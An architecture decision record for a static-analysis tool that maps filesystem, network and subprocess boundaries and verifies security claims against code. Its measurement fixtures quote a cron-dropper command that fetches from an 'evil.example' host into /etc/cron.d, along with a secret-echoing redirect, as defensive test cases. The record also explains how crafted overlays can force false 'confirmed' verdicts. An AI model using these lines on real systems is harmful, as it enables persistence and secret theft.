<!-- SPDX-License-Identifier: AGPL-3.0-or-later -->
# ADR-0016: I/O Boundary Analysis and Security Claim Verification

Date: 2026-03-18
Updated: 2026-08-13
Status: Accepted

## Context

### Origin: the trust question

Hypergumbo's dataflow system (ADR-0015) classifies edges as read/write/mutate/delete and traces data dependencies between symbols through named channels. A different question arose from the practical situation of recommending hypergumbo to others: *what would it take to feel confident running a program on a machine with sensitive data?*

The answer reduces to four buckets:

1. **Which code paths read from the filesystem, and what do they read?**
2. **Which code paths write to the filesystem, and what do they write?**
3. **Which code paths receive data from the network, and from where?**
4. **Which code paths send data to the network, and to where?**

If you can answer these four questions exhaustively, you can reason about whether a program's actual behavior matches your trust requirements.

### Why static analysis can answer this (mostly)

**hypergumbo analyzes the target repository, not its installed dependencies.** `site-packages` is not in the tree, so no edge reaches a dependency's internals and the syscall it eventually makes is never observed. Measured, with controls firing in the same run: a file whose body is `requests.post(url, data={"s": secret})` produced **zero `net_send` chains**, while `open()` / `file.read` / `os.environ` in the same file produced theirs (INV-fotav).

The I/O primitive catalog for any given language is therefore **finite and stable** — a curated list of stdlib functions, not an unbounded set of library APIs. What bounds it is what hypergumbo can be *responsible for*: widening the shipped catalog to cover requests/httpx/urllib3 would make hypergumbo the owner of every third-party library's API surface.

The price of that boundary is **recall**, and it is not a false *verdict* — `verify-claims` returns `inconclusive` and names the uncovered modules (the coverage gate added for INV-fibis) rather than confirming a clean boundary. But hypergumbo cannot positively detect the most common form of Python network egress, so a claim about `net_send` can never resolve on its merits for any repo that uses an HTTP client library.

**Resolution: a project-local overlay, not more built-in rows.** Widening the shipped catalog to cover requests/httpx/urllib3 would make hypergumbo the owner of every third-party library's API surface — precisely the unbounded curation burden this ADR declined, and §300 already prices ("I/O primitive catalogs require curation... this is finite and stable work, but it is work"). Instead, the extension point ADR-0017 §370 already granted the **taint** arm ("any project can define its own taint sources, sinks, and sanitizers by writing YAML files... with project-local entries taking precedence") is extended to the **boundary** arm, which had no user-supplied channel of any kind: `load_catalog(language)` read only the packaged directory, and `extra_catalogs:` accepted only the three taint keys. ADR-0016 predates ADR-0017 and made its scoping decision before that pattern existed.

An overlay is a YAML file in the same schema as a shipped catalog, declaring `status: overlay`:

```bash
hypergumbo io-boundaries . --io-primitives overlays/python-http-clients.yaml
```
```yaml
# or, travelling with the claims it supports:
extra_catalogs:
  io_primitives:
    - overlays/python-http-clients.yaml
```

Precedence mirrors the taint arm rather than inventing a second rule: **built-in < claims-file `extra_catalogs:` < CLI `--io-primitives`**, and a later path outranks an earlier one, all keyed on qualified name — the same key `IoBoundaryCatalog.merge` already uses for language inheritance (scala → java). Four constraints keep an overlay from laundering itself into the curated catalog's standing:

- `status: overlay` is required and `status: complete` is **refused** — that status asserts a provenance-backed stdlib enumeration, which an overlay is not making.
- `stdlib_modules` / `stdlib_prefixes` are dropped, so `is_stdlib_module` keeps answering about the actual interpreter. A `requests` overlay must not relabel a PyPI package as stdlib; that feeds the dependency classifier and the F3 filter, and would be a supply-chain misread rather than an I/O one.
- `module_completeness` is **permitted** (owner ruling, 2026-08-15) — but only under that spelling; the legacy `stdlib_module_completeness` is refused in an overlay with a message naming the honest key. It is the single grant of confirmability (INV-buzab), and it is permitted because **overlays are where third-party modules go**: without the declaration a dependency could never leave the uncatalogued set no matter how carefully its rows were written, so `verify-claims` could never confirm anything for a repo that has dependencies. The grant is bounded by two things rather than by refusal — `retrieved:` remains mandatory, so an entry is a dated audit record and not a switch, and it still does not promote the module into `stdlib_modules` (ADR-0041 §3). The rename is not cosmetic: once an overlay may declare `numpy` enumerated, a key named `stdlib_*` holds two populations under a name describing one. **Known residual:** the stderr disclosure names the overlay *path* but not which modules it vouched for, so the most powerful line in a user's overlay is the least visible one.
- A missing or malformed overlay path is an **error** (exit 2, inconclusive), never a silent skip — degrading to "no extra primitives" reads exactly like a clean repo.

Hypergumbo ships a worked example under `docs/io-primitives-overlays/`, deliberately **not** beside the shipped catalogs: the user owns those rows.

**And owning the rows means owning the verdict — the constraints above bound an overlay's STANDING, not its INFLUENCE.** Since INV-buzab, a call the catalogue *classified* is what `examined` means, so a row does not merely add detection: it also decides whether a `must_not_exist` claim over some *other* boundary may be `confirmed`. A row carrying the wrong boundary therefore yields an examined call that produces no chain for the boundary actually claimed. Measured three ways on one fixture posting `os.environ["API_KEY"]` through `requests.post`, claim "never sends data over the network" — the middle run is the control that proves the row matched:

| overlay | verdict | exit |
|---|---|---|
| none | `inconclusive` | 2 |
| `requests.post` declared `net_send` | `violated` | 1 |
| `requests.post` declared `fs_read` | **`confirmed`** | **0** |

**With one carve-out, and it is a property of the VOCABULARY rather than of overlays (INV-gahuz).** The inference above — a classified call is examined, therefore it settles claims about *other* boundaries — rests on a matched row implying a **known and complete** surface. That holds for every boundary that names what a primitive *does*: `os.makedirs` classified `fs_write` really is an examined negative for a network claim. It inverts for `subprocess`, the one member of `CATALOG_BOUNDARY_TYPES` that names **opacity** — control leaves the process for a program whose I/O is not in the edge set at all. Measured on a six-line fixture whose only statement is `subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])`, with `open(f, "w")` and `socket.send` controls returning `violated` rc 1 in the same session:

| claim | before | after |
|---|---|---|
| `fs_write` must_not_exist | **`confirmed`** rc 0 | `inconclusive` rc 2 |
| `net_send` must_not_exist | **`confirmed`** rc 0 | `inconclusive` rc 2 |

A program that downloads a remote payload into a root cron directory confirmed both that it never writes to the filesystem and that it never reaches the network. The row was **correct** — `subprocess.run` genuinely is a subprocess primitive — so this is not a cataloguing error to be fixed by writing better rows; the defective step is the inference. `io_boundary.OPAQUE_BOUNDARIES` names the exception once and `verify_claims._opaque_launch_sites` is its only consumer, so the two cannot drift. The disclosure names the **call** (`subprocess.run`), not the module, because "the catalogue could not classify `subprocess`" would be false and would send a reader to add a row that already exists.

This is *not* an argument for refusing rows — refusing them would close the legitimate case this channel exists for, and it is not a regression, since before INV-buzab row *presence* alone permitted the whole module on strictly weaker evidence. What separates a row from a completeness entry is **scope, not safety**: a row vouches for one named call surface, a completeness entry vouches for every call the catalogue could not classify. The gap this leaves is that a verdict records nothing about which catalogue it trusted — a `confirmed` reached against the shipped catalogue and one reached against a repo-supplied overlay are byte-identical in both the text and the `--json` envelope. Tracked as INV-zosun, where the indicated first move is disclosure (stamping the verdict with its catalogue provenance) rather than restriction.

**One declaration feeds both arms — the overlay is NOT a second place to say the same thing.** ADR-0017 §453 already made `io_primitives` the single source of truth for built-in taint sinks: every write-side primitive auto-derives into a `TaintSink` through `AUTO_SINK_ZONE_MAP` (`net_send → (network, untrusted)`, `fs_write → (host_fs, untrusted)`, …), and no `taint_sinks/` directory ships at all, precisely so there is no "second source of truth that could drift out of sync." An overlay that fed only the boundary arm would have re-created that drift one layer up, with the user — not hypergumbo — paying for it by declaring `requests.post` twice in two schemas. So `--io-primitives` overlays are threaded into the same derivation: `load_full_taint_catalog(io_overlay_paths=…)` → `_derive_auto_imports_from_io_primitives`, with overlays grouped by their declared language so a Go overlay never seeds Python sinks. Measured on the shipped example: Python taint sinks 113 → 172, `requests.post` arriving as `zone=network, trust_level=untrusted`. The direction is additive-only — more sinks can add findings, never delete one — and non-destruction of the built-in sink set is asserted rather than assumed.

**The formats stay separate, because only sinks overlap.** A taint *source* carries a label (`untrusted_input`, `host_secret`) and a *sanitizer* is a function that clears taint; neither is an I/O crossing and neither has an `io_primitives` counterpart. A sink additionally carries zone and trust level, which the boundary vocabulary deliberately does not model — `boundary` names *what crossing happened*, not *how trusted the destination is*. Merging the two schemas would re-conflate exactly the kind of axis the 6.0.0 concept-axis work (ADR-0023/0027/0028/0031/0032) exists to keep apart. Users who need project-local *sources* or *sanitizers* continue to use `--taint-sources` / `--taint-sanitizers`; users who need a third-party *sink* declare the primitive once, here.

The exception is **native code** (C extensions, FFI, JNI, N-API, etc.). Compiled native code can call OS primitives directly, bypassing the language's stdlib. However:

- Many native extensions receive data from the managed language and return results — the managed code does the I/O.
- When native source *is* available (Rust crates ship source by default; Python sdists include C source), hypergumbo can analyze both sides and link them through existing FFI linkers (pyffi, cgo, jni, napi, wasm_bindgen, etc.).

This yields three **transparency tiers** for any code path:

| Tier | Condition | Analysis capability |
|------|-----------|-------------------|
| **Transparent** | Source present, analyzer + linker available | Full I/O boundary tracing |
| **Opaque** | Compiled binary only, no source | Flag the boundary, cannot trace past it |
| **Partial** | Source present, but no analyzer or linker for the FFI mechanism | Flag as gap, manual review needed |

These are distinct from hypergumbo's existing supply-chain tiers (first-party vs. dependency code).

> **Implementation note.** These three tiers were never materialized as a persisted field. Edge opacity is carried structurally by `is_resolved=False` ([ADR-0037](0037-edge-resolution-semantics.md)): an unresolved edge to an external boundary node *is* the "opaque boundary" flag. "Opaque" here is scoped to native/compiled code without source. The same treatment covers **command-mediated invocation**: a bash script shelling out to `curl` / `rm` / `git` is classified `subprocess` (launching an external program), and the invoked program's own I/O is opaque (no in-tree source, no transitive funnel). So command-mediated languages populate the `subprocess` boundary by emitting unresolved external-command edges — *not* via an `io_primitives` data-I/O catalog that would mis-attribute `curl`'s network activity to the shell script itself.
>
> **Scope of that prohibition, drawn explicitly (INV-vavup, 2026-08-13).** The sentence above rules out attributing a **launched program's** I/O to the script that launched it. It does **not** rule out cataloguing the I/O the shell performs **itself**, and the difference is load-bearing because a shell has *two* I/O surfaces:
>
> | construct | who performs the I/O | treatment |
> |---|---|---|
> | `curl -o /etc/cron.d/pwned` | **curl** — an opaque external program | `subprocess` + opacity. Attributing `fs_write` to the script would be the mis-attribution this note forbids. |
> | `echo "$SECRET" > /etc/cron.d/pwned` | **the shell itself** — it opens and writes the file (`echo` is a builtin, and even for an external command the redirection is established by the shell before `exec`) | the shell's own primitive, with the same standing `os.remove` has in Python. Cataloguing it is correct. |
>
> This ADR's prohibition was read twice as forbidding *any* bash `io_primitives` catalogue, and that reading is wrong — it forbids exactly the case that would be a mis-attribution and is silent on the case that would be accurate. The measured consequence of the gap: `bash.py` dispatches on `function_definition` / `declaration_command` / `command` only, so on an 8-statement script exercising the common idioms, the three redirection writes to host paths produced **zero edges** while the four launches were emitted correctly. `echo $SECRET > /etc/cron.d/pwned` — the same cron-dropper INV-larol was filed about, written with a builtin and a redirect instead of `curl -o` — is invisible.
>
> Nor is "redirection is syntax, not a named call" a barrier: this catalogue schema already classifies non-call constructs via `attributes:` (`os.environ`, `sys.stdout`, `sys.stdin`), which reach the boundary pipeline through synthesized `module_attr_ref` edges (WI-guhok). The same split applies — the **analyzer** emits an edge naming the redirect target, the **catalogue** classifies the operator (`>` / `>>` → `fs_write`, `<` → `fs_read`), and `>` versus `>>` is a mode distinction for the existing `io_mode` machinery rather than separate rows that would collide under INV-zumin.
>
> **Sequencing is load-bearing.** Marking bash taint-supported on the strength of its launch edges *before* redirection writes are visible would let a redirection-dropper pass the coverage gate and confirm "never writes to the host filesystem" — a false confirm through a hole distinct from the one INV-larol closed. Redirection first, taint-support second.

> **The ruling above was enforced by nothing but its own absence, and now it is enforced (INV-larol).** Until 2026-08-12 the only thing standing between this tree and a bash data-I/O catalogue was that nobody had written the file — and three places in the tree recommended writing it, including `verify_claims.py`'s own comment on the INV-dabov gate. Measured on the shipped CLI against a two-line script whose only command is `curl -o /etc/cron.d/pwned <url>`, claim *"never writes to the host filesystem"*:
>
> | `io_primitives/bash.yaml` | `total_io_edges` | `command_launch_edges` | fs_write claim | net_send claim |
> |---|---|---|---|---|
> | absent | 0 | 1 | `inconclusive` rc 2 | `inconclusive` rc 2 |
> | `curl → net_send` | 1 | 0 | **`confirmed` rc 0** | `violated` rc 1 |
> | `curl → net_send` + `subprocess` | 1 | 0 | `inconclusive` rc 2 | `violated` rc 1 |
>
> Six *correct* lines — `curl` really does send data to a remote host — bought a green tick over a write into a root cron directory, because since INV-buzab a classified call is what `examined` means, and classifying a launch stripped the opacity INV-gahuz relies on. The third row is the control: the same run with opacity *also* declared withholds the confirmation and still reports the network violation, so detection was never what was at stake. Note also that cataloguing a command **displaces** the producer stamp rather than supplementing it (`command_launch_edges` 1 → 0), collapsing the count-vs-disclose split WI-javoh built.
>
> The gate is now structural rather than catalogue-voluntary: `PRODUCER_OPAQUE_BOUNDARIES` carries the analyzer-stamped `command_launch` alongside the catalogue-declared `subprocess`, and `_opaque_launch_sites` consults the producer stamp *before* `classify_call`. This does not reopen the ruling — a bash catalogue is still not the right answer, for the reasons above — it removes the false confirm that would follow if anyone decided otherwise.

### Security claim verification

For projects with stated security properties — "relays never see plaintext," "decrypted content never hits the host disk" — the I/O boundary map enables **verification against actual code**:

> **Claim: "Decrypted content is never written to the host filesystem"**
> - 14 code paths reach fs-write primitives
> - 12 involve only encrypted blobs (ciphertext confirmed via crypto-flow trace)
> - 2 involve plaintext: `cache.rs:47` writes to tmpfs (guest-only), `debug.rs:203` writes a log when `--verbose` is set (**violates claim in debug mode**)

This moves security properties from documentation-level assertions to evidence-backed findings.

## Decision

### 1. I/O boundary classification vocabulary

Define a controlled vocabulary for system boundary types:

| Boundary | Direction | Meaning | Examples |
|----------|-----------|---------|---------|
| `fs_read` | inbound | Read data from local filesystem | `open(f).read()`, `Path.read_text()`, `os.walk()`, `std::fs::read()` |
| `fs_write` | outbound | Write data to local filesystem | `open(f,'w').write()`, `shutil.copy()`, `std::fs::write()` |
| `net_recv` | inbound | Receive data from network | `socket.recv()`, `TcpStream::read()`, HTTP response body |
| `net_send` | outbound | Send data to network | `socket.send()`, `TcpStream::write()`, HTTP request body |
| `ipc_recv` | inbound | Receive data from another process | `stdin.read()`, pipe read, shared memory read |
| `ipc_send` | outbound | Send data to another process | `stdout.write()`, pipe write, shared memory write |
| `env_read` | inbound | Read ambient CONFIGURATION — values that may carry a credential | `os.environ`, `std::env::var()`, command-line args |
| `host_info_read` | inbound | Read host DESCRIPTION or user identity — not a secret (split from `env_read` by INV-tutar) — **including the clock** (WI-pavob, WI-tubij) | `runtime.GOOS`, `os.uname()`, `navigator.platform`, `pwd.getpwnam()`, `time.time()`, `Instant::now()` |

**A clock read is `host_info_read`** (WI-pavob ruling 2026-08-26, landed across all fifteen catalogues by WI-tubij). The reasoning is that a clock value is host state crossing into the program, and a monotonic clock is not an exception: on Linux `CLOCK_MONOTONIC` runs from boot, so an early read leaks approximate uptime, which distinguishes machines. Two consequences were accepted on the record when the ruling was made rather than discovered afterwards. First, **`host_info_read` now fires almost universally** — nearly every program timestamps something — so this category's discriminating power is deliberately low and a claim of the form "never reads host information" is close to unsatisfiable in practice. Second, it is a **recall-increasing** change: it makes more claims fail, not fewer, which is the opposite direction from the false-inconclusive work, and it must therefore land either side of a baseline measurement but never in the middle of one.

Arithmetic on an already-captured time is not a clock read and carries no row: `Instant::duration_since` samples nothing, while `Instant::elapsed` is defined as `Instant::now() - *self` and does. Setting the clock (`clock_settime`) is a host *write* and is a separate question this boundary does not answer.

The census and the concept audit behind that split — 134 of the 195 shipped `env_read` rows were host description or identity, and the catalogue was already withholding rows in `python.yaml` to protect the derived label — are in [`docs/surveys/env-read-boundary-census.md`](../surveys/env-read-boundary-census.md).
| `subprocess` | outbound | Launch or communicate with child process | `subprocess.run()`, `Command::new()` |

The first four are the primary trust-question buckets. The latter four capture additional system boundary interactions relevant to security reasoning.

**Risk classification.** These boundary types are *not* ranked by a single severity scale. Risk is expressed by two distinct, complementary models:

- The **taint source/sink model** ([ADR-0017](0017-taint-zone-dataflow.md) §2b) is the canonical risk taxonomy. Every write-side/outbound boundary (`fs_write`, `net_send`, `subprocess`, `env_write`, `ipc_send`, …) is an untrusted taint **sink** (where tainted data lands or escapes); every read-side *sensitive* boundary (`env_read`, `host_info_read`, `net_recv`, `ipc_recv`, `db_read`) is an untrusted **source** — carrying its own label, since `env_read → host_secret` and `host_info_read → host_description` are different facts (INV-tutar); `fs_read` and `browser_storage_read` are deliberately quiet (sensitivity depends on what is stored). This is the model `verify-claims` consumes, and network-egress risk is additionally graded by supply-chain `dst_tier`.
- The `io-boundaries` output additionally carries a narrow, **display-only** `high_risk` marker, scoped to `subprocess` — launching an external program is arbitrary code execution, the one boundary with a clean "always risky" invariant (completeness-ratcheted per language). `high_risk` is **not** a net/fs risk taxonomy and must not be extended into one: destructive-filesystem and network-egress risk are the taint model's concern, not a second hand-curated set (`io_boundary.HIGH_RISK_PRIMITIVES` is subprocess-only for exactly this reason).

### 2. I/O primitive catalogs (per-language, YAML-driven)

For each supported language, maintain a catalog of stdlib/runtime functions classified by boundary type. These are YAML files following the pattern established by ADR-0015's dataflow patterns:

```yaml
# io_primitives/python.yaml
language: python

fs_read:
  - module: builtins
    functions: [open]  # when mode is 'r' or default
    notes: "Mode detection: 'r'/'rb' = fs_read, 'w'/'wb'/'a' = fs_write"
  - module: pathlib.Path
    methods: [read_text, read_bytes, stat, exists, is_file, is_dir, iterdir, glob, rglob]
  - module: os
    functions: [listdir, scandir, stat, access, readlink, walk]
  - module: shutil
    functions: [which]

fs_write:
  - module: builtins
    functions: [open]  # when mode is 'w', 'a', 'x'
  - module: pathlib.Path
    methods: [write_text, write_bytes, mkdir, touch, unlink, rename, replace, symlink_to]
  - module: os
    functions: [mkdir, makedirs, remove, unlink, rename, replace, symlink, link]
  - module: shutil
    functions: [copy, copy2, copytree, move, rmtree]
  - module: tempfile
    functions: [mkstemp, mkdtemp, NamedTemporaryFile, TemporaryDirectory]

net_send:
  - module: socket.socket
    methods: [send, sendto, sendall, sendmsg, connect]
  - module: http.client.HTTPConnection
    methods: [request, putrequest]
  - module: urllib.request
    functions: [urlopen, Request]

net_recv:
  - module: socket.socket
    methods: [recv, recvfrom, recv_into, recvmsg]

subprocess:
  - module: subprocess
    functions: [run, Popen, call, check_call, check_output]
  - module: os
    functions: [system, popen, exec, execvp, fork, spawn]

env_read:
  - module: os
    attributes: [environ]
    functions: [getenv]
  - module: sys
    attributes: [argv, stdin]
```

Similar catalogs needed for: Rust (`std::fs`, `std::net`, `std::process`), JavaScript (`fs`, `net`, `http`, `child_process`), Go (`os`, `net`, `io`, `exec`), Java (`java.io`, `java.net`, `java.nio`, `ProcessBuilder`), C (`fopen`, `socket`, `fork`, `exec`).

The catalogs are finite and stable. Python's stdlib I/O surface hasn't fundamentally changed across 3.x. Rust's `std` is similarly stable.

### 3. Analysis pipeline

The I/O boundary analysis runs as a post-processing pass over hypergumbo's existing graph:

**Phase 1: Identify boundary calls.** Walk all symbols and edges. For each call edge whose target matches an I/O primitive catalog entry, tag the edge with the boundary classification:

```python
edge.meta["io_boundary"] = "fs_read"
edge.meta["io_primitive"] = "pathlib.Path.read_text"
```

**Phase 2: Reverse trace.** For each identified boundary call, compute a reverse slice: which application-level entry points can reach this I/O call? This produces a set of **I/O chains**:

```
cli.main() -> profile.run_analysis() -> discovery.walk_tree() -> os.walk() [fs_read]
```

**Phase 3: Classify transparency.** For each I/O chain, check whether any link in the chain crosses into opaque territory:

- Call into a native extension without source -> **opaque boundary**, flag it
- Call through an FFI linker with source on both sides -> **transparent**, continue tracing
- Call into a dependency without analyzer coverage -> **partial**, flag the gap

**Phase 4: Aggregate into boundary map.** Produce a structured report grouping chains by boundary type:

```json
{
  "fs_read": {
    "chains": ["..."],
    "entry_points": ["cli.main", "profile.run_analysis"],
    "primitives_used": ["os.walk", "pathlib.Path.read_text", "open"],
    "opaque_boundaries": [],
    "transparency": "full"
  },
  "net_send": {
    "chains": [],
    "entry_points": [],
    "primitives_used": [],
    "opaque_boundaries": ["tree_sitter (C extension, no source analyzed)"],
    "transparency": "n/a - no net_send paths found"
  }
}
```

### 4. Security claim verification (optional layer)

A separate, optional input: security claims expressed as constraints on the I/O boundary map.

```yaml
# security-claims.yaml
claims:
  - id: SC-001
    text: "Decrypted content is never written to the host filesystem"
    constraint:
      boundary: fs_write
      must_not_contain:
        data_classification: plaintext
      exceptions:
        - path_pattern: "guest_fuse_daemon/**"
          reason: "Guest-local tmpfs, not host filesystem"

  - id: SC-002
    text: "Relays never see plaintext document content"
    constraint:
      boundary: net_send
      at_symbols: ["relay_*", "RelaySyncManager.*"]
      must_not_contain:
        data_classification: plaintext

  - id: SC-003
    text: "No network I/O occurs without user-initiated action"
    constraint:
      boundary: [net_send, net_recv]
      must_have:
        reachable_only_from: ["cli.main", "cli.analyze"]
        not_reachable_from: ["import_time_side_effects"]
```

The verifier checks each claim against the boundary map and produces a verdict:

- **Confirmed**: all I/O chains consistent with claim, full transparency
- **Confirmed with caveats**: consistent, but part of the reasoning could not be verified
- **Violated**: specific I/O chain contradicts the claim (with evidence)
- **Inconclusive**: insufficient analysis coverage to determine

> **Implementation note (INV-pojib, 2026-08-13).** The fourth verdict is now
> implemented, as `confirmed_with_caveats` at **exit code 3**, with a structured
> `caveats` list on each verdict (`VERIFY_CLAIMS_SCHEMA_VERSION` 2.0). It
> shipped for a consumer this section did not anticipate and which is stronger
> than the one it names.
>
> The wording above scoped caveats to *opaque boundaries* — I/O the analysis
> could see the existence of but not the content of. The consumer that forced
> the implementation is different in kind: an **entry the analysed repository
> supplied about itself**. A sanitizer declared through `--taint-sanitizers` or
> the claims file's `extra_catalogs:` block is trusted by design (§27), and
> trusting it is not the problem — the problem was that a verdict resting on it
> was indistinguishable, in prose *and* in exit code, from one the analysis
> earned unaided. Measured: an 8-line sanitizer file naming a no-op `launder`
> function took `os.remove(launder(os.environ["API_KEY"]))` from `violated`
> rc 1 to `confirmed` rc 0.
>
> An opaque boundary is something the tool *could not see*. A repo-supplied
> entry is something the tool *was told*. Both are "consistent, but not
> verified by us", which is why one verdict value carries both — the `kind`
> field on each caveat is what keeps them distinguishable.
>
> **Both kinds are now implemented** (`user_supplied_sanitizer`, then
> `opaque_boundary` — owner-authorized 2026-08-13). The opaque-boundary kind is
> the consumer this section originally specified, and it exists to end a
> conflation inside `inconclusive`: *"a whole language here has no catalogue, I
> am blind"* and *"I examined every call and understood them all; three hand
> control to `git`/`pip`/`rustup`, and no static analysis can see inside a
> launched process"* were reaching the same verdict. The auditor distinction is
> exact — a **disclaimer** versus a **qualified opinion** — and because
> hypergumbo launches programs *by design*, plain `confirmed` was permanently
> unreachable for its own self-proof, making that artifact one that could never
> say anything at all.
>
> Two constraints keep it honest. It is raised **only when named launch sites
> are the sole remaining blocker** (`BoundaryCoverage.qualifying_only`): an
> opaque launch beside a genuinely uncatalogued module is still blindness,
> because the reader cannot tell which gap produced the silence. And because
> the direction is *towards* confirming, its soundness rests entirely on the
> launch list being complete — which is why it ships only after that surface
> was hardened (INV-motos, INV-gahuz, INV-larol, INV-virat, INV-zumin).
>
> The wording says *"cannot see inside a launched program"* rather than
> anything implying full coverage: "I saw every call" is not "I saw every I/O",
> and INV-vavup measured bash redirection writes emitting no edge at all.
>
> Also not covered, and measured rather than assumed: a user-supplied taint
> **source or sink** suppresses findings by a different mechanism — sanitizers
> `.extend()` the catalogue, but sources and sinks merge with *replacement* on
> `(module, name, kind)`, so a shipped sink can be displaced out of its zone and
> the flow never constructed. No caveat is raised, because there is no finding
> to attribute. Filed as INV-faput.

### 5. Integration with existing infrastructure

The I/O boundary analysis builds on existing hypergumbo infrastructure:

- **Reuses** the YAML pattern machinery (ADR-0015) for I/O primitive catalogs
- **Reuses** the `meta` dict on edges for boundary classification
- **Reuses** `slice --dataflow` reverse traversal for chain computation
- **Extends** the crypto-flow linker's output: if a `crypto_flow` edge shows data is encrypted before reaching a `net_send` boundary, the security claim verifier can use this as evidence
- **Fits** the multi-pass architecture (ADR-0012): I/O boundary tagging is a post-processing pass

### 6. CLI interface

```bash
# Produce I/O boundary map
hypergumbo io-boundaries repo/

# Produce boundary map as JSON
hypergumbo io-boundaries --format json repo/

# Verify security claims
hypergumbo verify-claims --claims security-claims.yaml repo/

# Show all code paths that reach network sends
hypergumbo slice --io-boundary net_send --reverse repo/
```

### 7. Resolved design questions

**`open()` dual classification.** Python's `open()` is both `fs_read` and `fs_write` depending on mode. Decision: **conservatively classify as both** by default. If the analyzer can extract the mode argument (literal string), narrow to the correct boundary. If the mode is a variable, keep both classifications. This is consistent with the "honest about limitations" principle.

**Transitive dependencies.** Decision: **trace everything, group by supply chain tier.** The boundary map includes all code paths (first-party and dependency), but the output groups chains by tier so users can focus on first-party code or drill into dependency paths.

**Runtime I/O.** Decision: **include but tag as `runtime_io`.** Python's import system reads `.py`/`.pyc` files — this is real I/O but universal. Tag it distinctly so it can be filtered from reports that focus on application-level I/O.

**Dynamic dispatch.** Decision: **flag as unresolvable.** When a call target is computed at runtime (`getattr(obj, name)()`), the I/O boundary status is unknown. Flag the call site with `io_boundary: "unknown_dynamic"` so the boundary map is explicit about what it cannot determine.

**Naming.** Decision: **"I/O boundary analysis"** for the feature, **"boundary map"** for the output artifact, **"claim verification"** for the security layer. These are descriptive and unambiguous.

### 8. Scope and limitations

**What this can do:**
- Exhaustively enumerate I/O boundary calls in pure managed-language code
- Trace call chains from application entry points to I/O primitives
- Flag opaque native code boundaries
- Cross FFI boundaries when source + linker are available
- Integrate with crypto-flow tracing to distinguish encrypted vs. plaintext I/O
- Verify stated security claims against the actual code graph

**What this cannot do:**
- See inside compiled native code without source (strace/dtrace needed for runtime verification)
- Determine conditions under which an I/O path executes (requires control-flow sensitivity beyond the current graph)
- Guarantee that analyzed source matches the binary actually running (reproducible builds problem)
- Detect I/O performed by the language runtime itself (import machinery, GC finalizers, etc.) — tagged as `runtime_io` but not exhaustively enumerable
- Replace a full security audit — this is evidence gathering, not a proof system

**Future work that would strengthen the analysis:**
- Control-flow sensitivity: "this `fs_write` only executes when `--output-file` is passed"
- Data classification propagation: track whether data flowing to an I/O boundary is "user content," "metadata," or "ciphertext"
- Runtime correlation: compare static boundary map against strace/dtrace output to find divergences
- Supply-chain depth integration: distinguish "my code does `net_send`" from "my dependency's dependency does `net_send`"

## Consequences

### Positive

1. **Enables informed trust decisions**: users can see exactly what a program does to their machine before running it outside a sandbox
2. **Security claims become testable**: project maintainers can write claims and CI can verify them on every commit
3. **Builds on existing infrastructure**: no new graph model needed — this is a composition of existing edge metadata, YAML catalogs, and slice traversal
4. **Polyglot by design**: works across hypergumbo's full language coverage, which matters for projects like PlazaFlow (Rust + TypeScript + C)
5. **Honest about limitations**: the transparency tier model makes it clear what the analysis can and cannot see

### Negative

1. **I/O primitive catalogs require curation**: each language needs a manually maintained list of stdlib I/O functions. This is finite and stable work, but it is work.
2. **Opaque boundaries reduce confidence**: for projects heavy on native code (ML/data science Python, game engines), many paths will be flagged as opaque rather than fully traced
3. **No control-flow sensitivity**: "this code *can* reach `fs_write`" is weaker than "this code *will* reach `fs_write` under conditions X." Users must understand this limitation.
4. **Security claim YAML format needs iteration**: the constraint language for expressing claims will need real-world usage to converge

### Neutral

- Does not conflict with existing dataflow analysis — the two systems share infrastructure but answer different questions
- The I/O primitive catalogs could eventually be community-maintained (similar to security advisory databases)

## Implementation phases

### Phase 1: Python I/O boundary map (dogfood on hypergumbo itself)

1. Write `io_primitives/python.yaml` catalog
2. Add boundary-tagging pass in analysis pipeline
3. Add `hypergumbo io-boundaries` CLI command
4. Run on hypergumbo's own codebase and verify results manually
5. Publish boundary map as documentation

This is the minimum useful increment: hypergumbo analyzing itself, answering the original trust question.

### Phase 2: Multi-language catalogs and FFI tracing

1. Add catalogs for Rust, JavaScript/TypeScript, C, Go, Java
2. Integrate with FFI linkers so chains cross language boundaries
3. Test on a polyglot project (PlazaFlow is the natural candidate)

### Phase 3: Security claim verification

1. Design the claim YAML format based on real claims from real projects
2. Implement the verifier
3. Add `hypergumbo verify-claims` CLI command
4. Integrate with crypto-flow linker for encrypted-vs-plaintext reasoning

### Phase 4: CI integration and ecosystem

1. GitHub Action / CI step that runs claim verification on every PR
2. Standard claim templates for common security properties
3. Community-maintained I/O primitive catalogs for additional languages

## Relationship to other ADRs

- **ADR-0015 (Dataflow Access Modes)**: provides the edge metadata model and YAML pattern infrastructure reused here
- **ADR-0012 (Pass Unification)**: I/O boundary tagging is a post-processing pass, fitting the existing multi-pass architecture
- **ADR-0008 (Autonomous Governance)**: security claim verification could extend the structural fix protocol — a violated security claim is an invariant violation
